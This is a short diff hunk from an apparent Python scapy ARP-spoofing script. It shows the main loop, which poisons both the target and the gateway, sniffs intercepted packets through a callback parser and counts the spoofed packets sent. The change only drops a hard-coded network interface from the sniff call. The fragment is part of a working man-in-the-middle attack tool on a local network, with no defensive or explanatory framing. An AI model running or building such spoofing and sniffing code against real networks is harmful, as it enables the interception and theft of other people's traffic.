@@ -70,7 +70,7 @@ try:
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
-        scapy.sniff(prn=callBackParser, store=False, iface="en0", count=10)
+        scapy.sniff(prn=callBackParser, store=False,  count=10)
         sent_packets_count = sent_packets_count + 2
         print("\r[*] Packets Sent " + str(sent_packets_count), end="")
         time.sleep(2)  # Waits for two seconds
